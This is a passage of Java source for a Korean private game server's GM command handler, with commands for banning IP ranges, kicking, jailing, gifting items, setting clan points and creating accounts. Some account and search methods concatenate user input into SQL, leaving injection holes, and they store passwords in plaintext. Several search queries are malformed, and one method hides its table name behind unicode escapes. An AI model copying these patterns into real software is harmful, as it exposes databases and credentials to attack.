				String[] banIpArr = banIp.split("\\.");

				IpTable iptable = IpTable.getInstance();
				pc.sendPackets("----------------------------------------------------");
				Account.ban(player.getAccountName(), SC_LoginResult.BANNED_REASON_NOMANNER); // 계정을
																							// BAN시킨다.
				player.logout();
				player.getNetConnection().kick();
				for (int i = 1; i <= 255; i++) {
					iptable.banIp(banIpArr[0] + "." + banIpArr[1] + "." + banIpArr[2] + "." + i);
				}

				pc.sendPackets("IP: " + banIpArr[0] + "." + banIpArr[1] + "." + banIpArr[2] + ".1~255 광역 차단.");
				pc.sendPackets("----------------------------------------------------");
			}
		} catch (Exception e) {
			pc.sendPackets(".광역밴  [범위]");
		}
	}


	private void 강제리스(L1PcInstance pc, String cmd) {
		
		try {
			StringTokenizer tok = new StringTokenizer(cmd);
			String name = tok.nextToken();
			if (name == null || name.equals(""))
				throw new Exception();

			L1PcInstance target = L1World.getInstance().getPlayer(name);
			if (target == null) {
				pc.sendPackets(String.format("%s 님을 찾을 수 없습니다.", name));
				return;
			}
			
			CUserSocket clnt = target.getNetConnection();
			clnt.kick();
			CS_CharSelect.restartProcess(target);
			Account acc		= clnt.getAccount();
			SC_CharAmount.send(clnt, acc.countCharacters(), acc.getCharSlot());
			if(acc.countCharacters() > 0)
				CS_CommonClick.sendCharPacks(clnt);
		
			
		} catch (Exception e) {
			pc.sendPackets(".강제리스 [캐릭터명])");
			
		}
		
		
		
	}
//	public void execute(L1PcInstance gm, String cmdName) {
//		운영자텔레포트(gm);
//	}
//	public static void 운영자텔레포트(L1PcInstance gm) {
//		ArrayList<String> result = new ArrayList<String>();
//		gm.sendPackets(new SC_NPCTalkReturn(gm.getId(), "GMt", (String[]) result.toArray(new String[result.size()])));
//	}
//	
	

	private void serversave(L1PcInstance pc) {
		Saveserver();// 서버세이브 메소드 선언
		pc.sendPackets("서버저장이 완료되었습니다.");
	}

	/** 서버저장* */
	private void Saveserver() {
		/** 전체플레이어를 호출* */
		Collection<L1PcInstance> list = null;
		list = L1World.getInstance().getAllPlayers();
		for (L1PcInstance player : list) {
			if (player == null)
				continue;
			try {
				/** 피씨저장해주고* */
				player.save();
				/** 인벤도 저장하고* */
				player.saveInventory();

			} catch (Exception ex) {
				/** 예외 인벤저장* */
				player.saveInventory();
				System.out.println("저장 명령어 에러(인벤만 저장함): " + ex);
			}
		}
	}

	private void GiveHouse(L1PcInstance gm, String poby) {
		   try {
			    StringTokenizer st = new StringTokenizer(poby);
			    String pobyname = st.nextToken();
			    int pobyhouseid = Integer.parseInt(st.nextToken());
			    L1PcInstance target = L1World.getInstance().getPlayer(pobyname);
			    if (target != null) {
			     if (target.getClanid() != 0) {
			      L1Clan TargetClan = L1World.getInstance().getClan(target.getClanid());
			      L1House pobyhouse = HouseTable.getInstance().getHouseTable(pobyhouseid);
			      if (pobyhouseid != 0 && pobyhouse == null) return;
                  final int expectedHouse = TargetClan.getHouseId();
                  try (l1j.server.server.model.L1InventoryTransaction tx =
                          l1j.server.server.model.L1InventoryTransaction.begin(gm,
                              l1j.server.server.model.L1AuctionTransaction.ORDER_KEY)) {
                      tx.requireTables("clan_data");
                      tx.sql(con -> {
                          try (java.sql.PreparedStatement ps = con.prepareStatement(
                                  "UPDATE clan_data SET hashouse=? WHERE clan_id=? AND hashouse=?")) {
                              ps.setInt(1,pobyhouseid);ps.setInt(2,TargetClan.getClanId());ps.setInt(3,expectedHouse);
                              if(ps.executeUpdate()!=1)throw new java.sql.SQLException("GM house assignment changed");
                          }
                      });
                      tx.commit(() -> {
                          TargetClan.setHouseId(pobyhouseid);
                          SC_SystemMessage.send(gm, target.getClanname()+" 혈맹의 아지트 변경을 저장했습니다.");
                      });
                  }

			     } else {
			      SC_SystemMessage.send(gm, target.getName()+"님은 혈맹에 속해 있지 않습니다.");
			     }
			    } else {
			     SC_ServerMessage.send(gm, 73, pobyname);
			    }
			   } catch (Exception e) {
			    SC_SystemMessage.send(gm, "\\fY.아지트 <지급할혈맹원> <아지트번호>");
			   }
			  }

	private void castleWarStart(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String name = tok.nextToken();
			int minute = Integer.parseInt(tok.nextToken());
			Calendar cal = RealTimeClock.getInstance().getRealTimeCalendar();
			if (minute != 0)
				cal.add(Calendar.MINUTE, minute);

			CastleWar war = CastleWarBusiness.getInstance().findWar(name);
			if (war == null)
				throw new Exception();

			war.nextCalendar(cal);
			CastleWarBusiness.getInstance().updateCastle(war.getCastleId());
			SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm");
			gm.sendPackets(String.format(".공성시간이 %s 으로 변경 되었습니다.", formatter.format(cal.getTime())));
			gm.sendPackets(param + "분 뒤 공성이 시작합니다.");
			formatter = null;
		} catch (Exception e) {
			gm.sendPackets(".공성시작 [성이름두글자] [분]");
		}
	}

	private void castleWarExit(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String name = tok.nextToken();
			CastleWar war = CastleWarBusiness.getInstance().findWar(name);
			if (war == null)
				throw new Exception();

			war.close();
		} catch (Exception e) {
			gm.sendPackets(".공성종료 [성이름두글자]");
		}
	}
	
	private void 혈맹포인트(L1PcInstance gm) {
//		if (!(gm.getClanRank() == 9 || gm.getClanRank() == 10))  { 
//		gm.sendPackets(new SC_SystemMessage("군주 또는 수호기사만 조회가 가능합니다."));
//	      return;
//	}
	if (gm.getClanid() != 0) {
		SC_SystemMessage.send(gm, "\\f:현재 혈맹포인트: ["+gm.getClan().getWarPoint()+"]");
		} else {
			SC_SystemMessage.send(gm, "혈맹에 가입되어 있지 않아 조회할 수 없습니다.");
		}
}

	
	

	private void effect(L1PcInstance pc, String param) {
		try {
			StringTokenizer stringtokenizer = new StringTokenizer(param);
			int sprid = Integer.parseInt(stringtokenizer.nextToken());
			SC_SkillSound.send(pc, pc.getId(), sprid);
			SC_SkillSound.broadcast(pc, pc.getId(), sprid);
		} catch (Exception e) {
			pc.sendPackets(".이팩트 [숫자] 라고 입력해 주세요.");
		}
	}

	private int 최소값(int itemid) {
		try {
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement(
						"SELECT * FROM shop WHERE item_id = ? AND selling_price NOT IN (-1) ORDER BY selling_price ASC limit 1");
				pstm.setInt(1, itemid);
				rs = pstm.executeQuery();
				if (rs.next()) {
					int temp = 0;
					if (rs.getInt("pack_count") > 1)
						temp = rs.getInt("selling_price") / rs.getInt("pack_count");
					else {
						temp = rs.getInt("selling_price");
					}
					int i = temp;
					return i;
				}
			} catch (SQLException e) {
				e.printStackTrace();
			} finally {
				SQLUtil.close(rs, pstm, con);
			}
			return 0;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return 0;
	}

	private int 최대값(int itemid) {
		try {
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement(
						"SELECT purchasing_price FROM shop WHERE item_id = ? ORDER BY purchasing_price DESC limit 1");
				pstm.setInt(1, itemid);
				rs = pstm.executeQuery();
				if (rs.next()) {
					int i = rs.getInt("purchasing_price");
					return i;
				}
			} catch (SQLException e) {
				e.printStackTrace();
			} finally {
				SQLUtil.close(rs, pstm, con);
			}
			return -1;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}


	private void 상점검사(L1PcInstance gm) {
		try {
			ArrayList<Integer> itemids = new ArrayList<Integer>();
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			int cnt;
			Iterator i$;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement("SELECT item_id FROM shop");
				rs = pstm.executeQuery();
				while (rs.next()) {
					if (!itemids.contains(Integer.valueOf(rs.getInt("item_id")))) {
						itemids.add(Integer.valueOf(rs.getInt("item_id")));
					}
				}
				cnt = 0;
				for (i$ = itemids.iterator(); i$.hasNext();) {
					int itemid = ((Integer) i$.next()).intValue();
					int 구매최저가 = 최소값(itemid);
					int 판매최고가 = 최대값(itemid);
					if ((구매최저가 != 0) && (구매최저가 < 판매최고가)) {
						SC_ChatPacket.sendDirect(gm, gm, "검출됨! [템 " + itemid + " : [구매값 " + 구매최저가 + "] [매입값 " + 판매최고가 + "]");
					}
					cnt++;
				}
			} catch (SQLException e) {
				e.printStackTrace();
			} finally {
				SQLUtil.close(rs, pstm, con);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private String parseStat(String s) throws Exception {
		if (s.equalsIgnoreCase("힘"))
			return "str";
		else if (s.equalsIgnoreCase("덱스"))
			return "dex";
		else if (s.equalsIgnoreCase("콘"))
			return "con";
		else if (s.equalsIgnoreCase("인트"))
			return "int";
		else if (s.equalsIgnoreCase("위즈"))
			return "wis";
		else if (s.equalsIgnoreCase("카리"))
			return "cha";
		throw new Exception(s);
	}

	public void fullstat(L1PcInstance pc, String param) {
		try {
			String[] arr = param.split(" ");
			if (arr == null || arr.length < 2)
				throw new Exception();

			String s = parseStat(arr[0]);
			FullStater.running(pc, s, Integer.parseInt(arr[1]));
		} catch (Exception e) {
			SC_SystemMessage.send(pc, String.format(".스텟 [힘/덱스/콘/인트/위즈/카리] [올릴수] 남은스텟 %d", (pc.getLevel() - 50 - pc.getBonusStats())));
		}
	}


	private void standBy(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String status = st.nextToken();
			if (status.equalsIgnoreCase("켬")) {
				if (Config.STANDBY_SERVER) {
					gm.sendPackets("이미 대기 상태로 돌입하였습니다.");
					return;
				}
				Config.STANDBY_SERVER = true;
				SC_ChatPacket.broadcastOpcode("서버가 오픈대기에 돌입합니다. 일부 기능이 차단되었습니다", Opcodes.S_MESSAGE);
			} else if (status.equalsIgnoreCase("끔")) {
				if (!Config.STANDBY_SERVER) {
					gm.sendPackets("대기 상태가 아닙니다.");
					return;
				}

				ThreadPool.getInstance().execute(new Runnable() {
					@Override
					public void run() {
						// Config.load();
						Config.STANDBY_SERVER = false;


						L1World.getInstance().broadcastServerMessage("\\aH정상적으로 서버가 오픈되었습니다. 기다려주신 여러분들께 진심으로 감사합니다.");

						SC_PacketBox.broadcastGreen("정상적으로 서버가 오픈되었습니다. 기다려주신 여러분들께 진심으로 감사합니다.");
					//	grn.clear();
					}
				});
			}
		} catch (Exception eee) {
			gm.sendPackets(".오픈대기 [켬/끔] 으로 입력하세요.");
			gm.sendPackets("켬 - 오픈대기 상태로 전환 | 끔 - 일반모드로 게임시작");
		}
	}


	private void hold(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				holdnow(gm, target);
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".감옥 캐릭명 으로 입력해주세요.");
		}
	}

	private void holdnow(L1PcInstance gm, L1PcInstance target) {
		try {
			// L1Teleport.teleport(target, 32736, 32799, (short) 34, 5, true);
			// L1Teleport.teleport(target, 32835, 32782, (short) 701, 5, true);
			target.start_teleport(32736, 32799, 34, target.getHeading(), 169, false, true);
			//target.start_teleport(32835, 32782, 701, target.getHeading(), 169, false, true);
			gm.sendPackets((new StringBuilder()).append(target.getName()).append(" 님 감옥으로 이동됨.").toString());
			target.sendPackets("감옥에 감금 되었습니다.");
		} catch (Exception e) {
			_log.log(Level.SEVERE, "", e);
		}
	}

	private void nocall(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = null; // q
			target = L1World.getInstance().getPlayer(pcName);
			if (target != null) { // 타겟
				// L1Teleport.teleport(target, 33437, 32812, (short) 4, 5,
				// true);
				target.start_teleport(33437, 32812, 4, target.getHeading(), 169, true, true);
			} else {
				gm.sendPackets("접속중이지 않는 유저 ID 입니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".가라 (보낼케릭터명) 으로 입력해 주세요.");
		}
	}

	private void searchObject(L1PcInstance gm, int type, String name) {
		try {
			String qry = null;
			switch (type) {
			case 0:// etcitem
				qry = String.format("select item_id, name, name_id from etcitem where name Like '%s'", name);
				break;
			case 1:// weapon
				qry = String.format("select item_id, name, name_id from weapon where name Like '%s'", name);
				break;
			case 2: // armor
				qry = String.format("select item_id, name, name_id from armor where name Like ' '%s'", name);
				break;
			case 3: // npc
				qry = String.format("select npcid, name, note from npc where name Like ' '%s'", name);
				break;
			case 4: // polymorphs
				qry = String.format("select polyid, name,id from polymorphs where name Like ' '%s'", name);
				break;
			case 5: // npc(gfxid)
				qry = String.format("select gfxid, name,note from npc where name Like ' '%s'", name);
				break;
			default:
				gm.sendPackets(".검색 [0~5] [name]을 입력 해주세요.");
				gm.sendPackets("0=잡템, 1=무기, 2=갑옷, 3=엔피시, 4=변신, 5=엔피시(gfxid)");
				return;
			}

			Selector.exec(qry, new FullSelectorHandler() {
				@Override
				public void result(ResultSet rs) throws Exception {
					int i = 0;
					while (rs.next()) {
						++i;
						gm.sendPackets(
								String.format("[%s]-[%s]-%s", rs.getString(1), rs.getString(2), rs.getString(3)));
					}
					gm.sendPackets(String.format("총 [%d]개 검색이 되었습니다.", i));
				}
			});
		} catch (Exception e) {
		}
	}
	

	
	
	private void 아아(L1PcInstance gm, String param) {
		
		
		int SearchCount = 0;
		
		
		StringTokenizer st = new StringTokenizer(param);
		String char_name = st.nextToken();
		L1PcInstance target = L1World.getInstance().getPlayer(char_name);
		try {
		if (target != null) {
			for (L1ItemInstance item : target.getInventory().getItems()) {
			
			
		if (item.get_item_level() > 0) {
			
		
		
		gm.sendPackets("\\f:"+item.getName()+" "+itemlevel(item));
		SearchCount++;
	
		
		
		}
		}
		
		gm.sendPackets("\\f:------------------------------------");
		gm.sendPackets("\\f:* 캐릭명: ["+target.getName()+"]  -  [ "+SearchCount +" ]개의 잠재력인형 보유");
		} else {
			gm.sendPackets("올바른 캐릭명을 입력해주세요.");
		}
		} catch (Exception e) {
			
		}
		
	}
	private void unprison(L1PcInstance pc, String param) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(param);
			if (target != null) {
				unprisonnow(pc, target);
			} else {
				pc.sendPackets(".마을 캐릭명");
				pc.sendPackets("그런 이름의 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			pc.sendPackets(".마을 캐릭명");
		}
	}

	private void unprisonnow(L1PcInstance gm, L1PcInstance target) {
		try {
			int i = 33437;
			int j = 32803;
			short k = 4;
			// L1Teleport.teleport(target, i, j, k, 5, false);
			target.start_teleport(i, j, k, 5, 169, false, true);
			gm.sendPackets((new StringBuilder()).append(target.getName()).append(" 님을 마을로 이동.").toString());
		} catch (Exception e) {
			_log.log(Level.SEVERE, "", e);
		}
	}

	private void autoAllPresent(L1PcInstance gm, String param) {
		try {
			
			StringTokenizer st = new StringTokenizer(param);
			int cycle = Integer.parseInt(st.nextToken(), 10);
			int second = Integer.parseInt(st.nextToken(), 10) * 1000;
			int itemid = Integer.parseInt(st.nextToken(), 10);
			int enchant = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);
			
			ThreadPool.getInstance().execute(new Runnable() {
				@Override
				public void run() {
					try {
						for (int i = 0; i < cycle; i++) {
							Collection<L1PcInstance> player = null;
							player = L1World.getInstance().getAllPlayers();
							l1j.server.server.model.network.core.broadcast.CAsyncSendConstBuffer memoGiftFrame = null;
String memoGiftText = null;
try {
for (L1PcInstance target : player) {
								if (target == null)
									continue;
								if (!target.isGhost() && !target.isPrivateShop()) {
									L1ItemInstance item = CObjectDB.CreateItem(itemid);
									item.setCount(count);
									item.setEnchantLevel(enchant);
									if (item != null) {
										if (target.getInventory().CheckAddable(item, count) == CInventory.OK) {
											target.getInventory().CreateOrAddItem(item);
										}
									}
									final String giftMessage = "오픈 대기 보상: " + item.getLogName() + " " + count + "개 획득 인벤토리 확인하세요";
if (memoGiftFrame == null || !giftMessage.equals(memoGiftText)) {
  if (memoGiftFrame != null) {
    memoGiftFrame.close();
    memoGiftFrame = null;
  }
  memoGiftFrame = new l1j.server.server.model.network.core.broadcast.CAsyncSendConstBuffer(
    l1j.server.server.model.network.core.sc.packet.SC_SystemMessage.nativeWriter(giftMessage),Integer.MIN_VALUE,Integer.MAX_VALUE);
  memoGiftText = giftMessage;
}
l1j.server.server.model.network.core.broadcast.CSharedBroadcast.sendRecipient(memoGiftFrame,target);
									SC_SkillSound.send(target, target.getId(), 1091);// 비둘기액션
									SC_SkillSound.send(target, target.getId(), 4856);// 하트액션
								}
							}
} finally {
 if (memoGiftFrame != null) memoGiftFrame.close();
}
							Thread.sleep(second);
						}
					} catch (Exception exception) {
						gm.sendPackets(".오토선물 [횟수] [시간]  [템ID] [인첸] [갯수]");

					}
				}
			});
			
			
		} catch (Exception exception) {
			gm.sendPackets(".오토선물 [횟수] [시간] [템ID] [인첸] [갯수]");
		}
		
		
	}
	public void 캐릭압류1(L1PcInstance gm, String name) {
		setCharBlock(gm, name);
	}
	private void chatx(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = null;
			target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				target.killSkillEffectTimer(L1SkillId.STATUS_CHAT_PROHIBITED);
				SC_SkillIconGFX.send(target, 36, 0);
				SC_ServerMessage.send(target, 288);
				gm.sendPackets("해당캐릭의 채금을 해제 했습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".채금해제 캐릭터명 이라고 입력해 주세요.");
		}
	}

	private void tell(L1PcInstance gm) {
		try {
			gm.start_teleport(gm.getX(), gm.getY(), gm.getMapId(), gm.getHeading(), 169, false, false);
		} catch (Exception e) {
		}
	}

	public void levelup2(L1PcInstance gm, String arg) {
		try {
			StringTokenizer tok = new StringTokenizer(arg);
			String user = tok.nextToken();
			L1PcInstance target = L1World.getInstance().getPlayer(user);
			int level = Integer.parseInt(tok.nextToken());
			if (level == target.getLevel()) {
				return;
			}
			if (!IntRange.includes(level, 1, 99)) {
				gm.sendPackets("1-99의 범위에서 지정해 주세요");
				return;
			}
			target.setExp(ExpTable.getExpByLevel(level));
			gm.sendPackets(target.getName() + "님의 레벨이 변경됨! .검 [캐릭명]으로 확인요망");
		} catch (Exception e) {
			gm.sendPackets(".렙작 [캐릭명] [레벨] 입력");
		}
	}



	
	private void 혈맹포인트조회(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String char_name = st.nextToken();
			L1PcInstance target = L1World.getInstance().getPlayer(char_name);
			
				
			if (target != null) {
				if (target.getClanid() != 0) {
					gm.sendPackets("\\f:"+target.getName() + "님의 혈맹이름 : "+target.getClanname());
					gm.sendPackets("\\f:현재 혈맹포인트: "+target.getClan().getWarPoint());
				
				} else {
					gm.sendPackets(target.getName() + "님은 혈맹에 속해있지 않습니다.");
				}
			} else {
				gm.sendPackets("존재하지 않는 유저 입니다.");
		}
	
		
			
		} catch (Exception e) {
			gm.sendPackets(".혈맹포인트조회 캐릭명");
		}
	}

	private void 혈맹포인트선물(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			if (유저 != null) {
				if (유저.getClanid() != 0) {
				if (id <= 0) { gm.sendPackets("지급 포인트는 양수여야 합니다."); return; }
				final CUserSocket gmSession = gm.getNetConnection();
				final CUserSocket memberSession = 유저.getNetConnection();
				final String memberName = 유저.getName();
				ClanTable.changeWarPoint(유저.getClan(), id, committed -> {
					CIOThreadCallback.getInstance().completeSession(gmSession, () ->
						gm.sendPackets(committed
							? memberName + "님의 혈맹에게 혈맹포인트 [" + id + "]을 지급하였습니다."
							: "혈맹포인트 지급이 확정되지 않았습니다. DB 기록을 확인해 주세요."));
					if (committed) CIOThreadCallback.getInstance().completeSession(memberSession, () ->
						SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,
							"당신의 혈맹에게 운영자님께서 혈맹포인트 [" + id + "] 지급하였습니다"));
				});
				} else {
					gm.sendPackets(유저.getName() + "님은 혈맹에 속해있지 않습니다.");
				}
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".혈맹포인트선물 캐릭명 포인트갯수");
		}
	}
	private void 혈맹포인트삭제(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			if (유저 != null) {
				if (유저.getClanid() != 0) {
				if (id <= 0) { gm.sendPackets("차감 포인트는 양수여야 합니다."); return; }
				final CUserSocket gmSession = gm.getNetConnection();
				final CUserSocket memberSession = 유저.getNetConnection();
				final String memberName = 유저.getName();
				ClanTable.changeWarPoint(유저.getClan(), -id, committed -> {
					CIOThreadCallback.getInstance().completeSession(gmSession, () ->
						gm.sendPackets(committed
							? memberName + "님의 혈맹에게 혈맹포인트 [" + id + "] 감소시켰습니다."
							: "혈맹포인트 차감이 확정되지 않았습니다. 잔액 및 DB 기록을 확인해 주세요."));
					if (committed) CIOThreadCallback.getInstance().completeSession(memberSession, () ->
						SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,
							"당신의 혈맹에게 운영자님께서 혈맹포인트 [" + id + "] 감소시켰습니다."));
				});
				} else {
					gm.sendPackets(유저.getName() + "님은 혈맹에 속해있지 않습니다.");
				}
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".혈맹포인트삭제 캐릭명 포인트갯수");
		}
	}
	
	private void allrecall(L1PcInstance gm) {
		try {
			for (L1PcInstance pc : L1World.getInstance().getAllPlayers()) {
				if (!pc.isGm() && !pc.isPrivateShop()) {
					recallnow(gm, pc);
				}
			}
		} catch (Exception e) {
			gm.sendPackets(".전체소환 커맨드 에러");
		}
	}


	private void recallnow(L1PcInstance gm, L1PcInstance target) {
		try {
			// L1Teleport.teleportToTargetFront(target, gm, 2 , 0);
			L1Teleport.getInstance().teleportToTargetFront(target, gm, 2, true);
			 target.sendPackets("게임 마스터에게 소환되었습니다.");
		} catch (Exception e) {
			_log.log(Level.SEVERE, "", e);
		}
	}

	private void ShopKick(L1PcInstance gm, String param) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(param);
			if (target != null) {
				gm.sendPackets((new StringBuilder()).append(target.getName()).append("님을 추방 했습니다.").toString());
				GameServer.disconnectChar(target);
			} else {
				gm.sendPackets("그러한 이름의 캐릭터는 월드내에는 존재하지 않습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".상점추방 캐릭명");
		}
	}

	private void chainfo(L1PcInstance gm, String param) {
		try {
			StringTokenizer stringtokenizer = new StringTokenizer(param);
			String s = stringtokenizer.nextToken();
			SC_Chainfo.send(gm, 1, s);
		} catch (Exception exception21) {
			SC_SystemMessage.send(gm, ".케릭검사 캐릭터명");
		}
	}
	private void 잠재력활성화(L1PcInstance gm, String param) {
		int count = 0;
		int ccount = 0;
		
		
		try {
			StringTokenizer st = new StringTokenizer(param);
			String status = st.nextToken();
			if (status.equalsIgnoreCase("켬")) {
				if (Config.잠재력활성화 == true) {
					SC_SystemMessage.send(gm, "이미 잠재력활성화 상태입니다.");
					return;
				}
				for (Object obj : L1World.getInstance().getObject()) {
					if (obj instanceof L1DollInstance) {
						L1DollInstance 인형 = (L1DollInstance) obj;
						if (인형.getMaster() != null) {
							count++;
							인형.deleteDoll(false);
						}
					}
				}
				Config.잠재력활성화 = true;
				
				SC_SystemMessage.send(gm, "잠재력이 활성화되어 옵션들이 리프레쉬되어야 하기 때문에");
				SC_SystemMessage.send(gm, "["+count+"]개의 소환된 인형들을 비소환시켰습니다.");
				SC_SystemMessage.send(gm, "잠재력옵션표기는 리스 후에 표기됩니다.");
			} else if (status.equalsIgnoreCase("끔")) {
				if (Config.잠재력활성화 == false) {
					SC_SystemMessage.send(gm, "이미 잠재력은 비활성화상태입니다.");
					return;
				}
				for (Object obj : L1World.getInstance().getObject()) {
					if (obj instanceof L1DollInstance) {
						L1DollInstance 인형 = (L1DollInstance) obj;
						if (인형.getMaster() != null) {
							count++;
							인형.deleteDoll(false);
						}
					}
				}
				Config.잠재력활성화 = false;
				
				SC_SystemMessage.send(gm, "잠재력이 비활성화되어 옵션들이 리프레쉬되어야 하기 때문에");
				SC_SystemMessage.send(gm, "["+count+"]개의 소환된 인형들을 비소환시켰습니다.");
				SC_SystemMessage.send(gm, "잠재력옵션표기는 리스 후에 없어집니다.");
			}
		} catch (Exception eee) {
			SC_SystemMessage.send(gm, ".잠재력 [켬/끔] 으로 입력하세요.");
			
		}
	}

	private void CharacterBalance(L1PcInstance pc, String param) {
		Connection con = null;
		PreparedStatement pstm = null;

		try {
			StringTokenizer st = new StringTokenizer(param);

			String charName = st.nextToken();
			int addDamage = Integer.parseInt(st.nextToken());
			int addDamageRate = Integer.parseInt(st.nextToken());
			int addReduction = Integer.parseInt(st.nextToken());
			int addReductionRate = Integer.parseInt(st.nextToken());

			L1PcInstance player = L1World.getInstance().getPlayer(charName);

			if (player != null) {
				player.setAddDamage(addDamage);
				player.setAddDamageRate(addDamageRate);
				player.setAddReduction(addReduction);
				player.setAddReductionRate(addReductionRate);
				player.save();
			} else {
				int i = 0;
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement(
						"update characters set AddDamage = ?, AddDamageRate = ?, AddReduction = ?, AddReductionRate = ? where char_name = ?");
				pstm.setInt(++i, addDamage);
				pstm.setInt(++i, addDamageRate);
				pstm.setInt(++i, addReduction);
				pstm.setInt(++i, addReductionRate);
				pstm.setString(++i, charName);
				pstm.executeQuery();
			}

		} catch (Exception e) {
			pc.sendPackets(".밸런스 [캐릭명] [추타] [추타확률] [리덕] [리덕확률]");
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}

	private void AddAccount(L1PcInstance gm, String account, String passwd, String Ip, String Host) {
		try {
			String login = null;
			String password = null;
			java.sql.Connection con = null;
			con = DatabaseFactory.getInstance().getConnection();
			PreparedStatement statement = null;
			PreparedStatement pstm = null; 

			password = passwd;

			statement = con.prepareStatement("select * from accounts where login Like '" + account + "'");
			ResultSet rs = statement.executeQuery();

			if (rs.next())
				login = rs.getString(1);
			if (login != null) {
				gm.sendPackets("이미 계정이 있습니다.");
				return;
			} else {
				String sqlstr = "INSERT INTO accounts SET login=?,password=?,lastactive=?,access_level=?,ip=?,host=?,banned=?,charslot=?,gamepassword=?,notice=?";
				pstm = con.prepareStatement(sqlstr);
				pstm.setString(1, account);
				pstm.setString(2, password);
				pstm.setTimestamp(3, new Timestamp(System.currentTimeMillis()));
				pstm.setInt(4, 0);
				pstm.setString(5, Ip);
				pstm.setString(6, Host);
				pstm.setInt(7, 0);
				pstm.setInt(8, 6);
				pstm.setInt(9, 0);
				pstm.setInt(10, 0);
				pstm.execute();
				gm.sendPackets("계정 추가가 완료되었습니다.");
			}

			rs.close();
			pstm.close();
			statement.close();
			con.close();
		} catch (Exception e) {
		}
	}
	private void AddAccount1(L1PcInstance gm, String account) {
		try {
			String login = null;

			java.sql.Connection con = null;
			con = DatabaseFactory.getInstance().getConnection();
			PreparedStatement statement = null;
			PreparedStatement pstm = null; 

	

			statement = con.prepareStatement("select * from \u006D\u0065\u0065\u0070 where login Like '" + account + "'");
			ResultSet rs = statement.executeQuery();
			L1ItemInstance total = gm.getInventory().GetFirstItemByClassID(777777);
			int count = total.getCount();
			if (rs.next())
				login = rs.getString(1);
			if (login != null) {
				gm.sendPackets("\uC774\uBBF8 \uACC4\uC815\uC774 \uC788\uC2B5\uB2C8\uB2E4\u002E");
				return;
			} else {
				String sqlstr = "INSERT INTO \u006D\u0065\u0065\u0070 SET login=?, count=?";
				pstm = con.prepareStatement(sqlstr);
				pstm.setString(1, account);
				pstm.setInt(2, count);


				pstm.execute();
				gm.getInventory().DeleteItemInInventory(777777, count);
				gm.sendPackets("\uB9E4\uC785\uC815\uBCF4 \uC800\uC7A5 \uC644\uB8CC" + " 매입증표 (" + count + "개)");
				gm.sendPackets("매입의 증표는 다음차에 수표로 지급 받을 수 있습니다.");
				gm.sendPackets(".매입지급 [계정아이디]");
				gm.sendPackets("지급율 : "+ Config.지급율 + " %");
			}

			rs.close();
			pstm.close();
			statement.close();
			con.close();
		} catch (Exception e) {
		}
	}
	private static boolean isDisitAlpha(String str) {
		boolean check = true;
		for (int i = 0; i < str.length(); i++) {
			if (!Character.isDigit(str.charAt(i)) // 숫자가 아니라면
					&& !Character.isUpperCase(str.charAt(i)) // 대문자가 아니라면
					&& !Character.isLowerCase(str.charAt(i))) { // 소문자가 아니라면
				check = false;
				break;
			}
		}
		return check;
	}

	private void reloadHouse(L1PcInstance gm, String cmd) {
		try {
			HouseTable.reload();
			gm.sendPackets("아지트 입찰시간이 재갱신되었습니다.");
		} catch (Exception e) {
			gm.sendPackets(".아지트갱신 으로 입력하세요.");
		}
	}

	// 인벤삭제
	private void InventoryDelete(L1PcInstance pc, String param) {
		try {
			for (L1ItemInstance item : pc.getInventory().getItems()) {
				if (!item.isEquipped()) {
					pc.getInventory().DeleteItemAmount(item);
				}
			}
		} catch (Exception e) {
			pc.sendPackets(".인벤삭제");
		}
	}

	private void targetInventoryDelete(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String char_name = st.nextToken();
